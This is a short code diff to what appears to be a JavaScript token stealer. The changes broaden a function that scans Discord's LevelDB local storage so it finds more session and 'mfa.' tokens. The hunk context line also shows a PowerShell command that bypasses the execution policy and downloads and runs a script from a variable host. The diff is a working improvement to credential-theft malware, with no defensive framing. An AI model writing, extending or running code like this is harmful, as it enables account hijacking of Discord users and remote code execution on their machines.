@@ -491,26 +491,32 @@ Start-Process powershell -ArgumentList '-ep bypass -c "irm https://${host}/run|i
 }
 
 function scanLDB(buf) {
-  const key = Buffer.concat([
-    Buffer.from("_https://discord.com"),
-    Buffer.from([0x00, 0x01]),
-    Buffer.from("token")
-  ]);
+  // search for \x01token (tail of any Discord LDB key, regardless of origin prefix)
+  const marker = Buffer.from([0x01, 0x74, 0x6f, 0x6b, 0x65, 0x6e]); // \x01token
   let pos = 0;
   while (pos < buf.length) {
-    const idx = buf.indexOf(key, pos);
+    const idx = buf.indexOf(marker, pos);
     if (idx === -1) break;
     pos = idx + 1;
-    const after = buf.slice(idx + key.length, idx + key.length + 200);
+    // look at next 250 bytes after the marker for value
+    const after = buf.slice(idx + marker.length, idx + marker.length + 250);
+    // find v10 encrypted blob (may be offset by LevelDB internal key suffix ~8 bytes)
     const v10 = after.indexOf(Buffer.from("v10"));
-    if (v10 >= 0 && v10 < 10) return { encrypted: true };
-    for (let s = 0; s < 20; s++) {
+    if (v10 >= 0 && v10 < 20) return { encrypted: true };
+    // fallback: look for plaintext token (old Discord / unencrypted)
+    for (let s = 0; s < 30; s++) {
       if (after[s] === 0x22) {
         const end = after.indexOf(0x22, s + 1);
-        if (end > s + 15 && end < s + 160) {
+        if (end > s + 15 && end < s + 200) {
           const val = after.slice(s + 1, end).toString("utf8");
           if (/^[A-Za-z0-9._-]{20,}$/.test(val)) return { token: val };
         }
+      }
+      // mfa. prefix (no quotes)
+      if (after[s] === 0x6d && after[s+1] === 0x66 && after[s+2] === 0x61 && after[s+3] === 0x2e) {
+        let end = s;
+        while (end < after.length && /[A-Za-z0-9._-]/.test(String.fromCharCode(after[end]))) end++;
+        if (end - s >= 25) return { token: after.slice(s, end).toString("ascii") };
       }
     }
   }
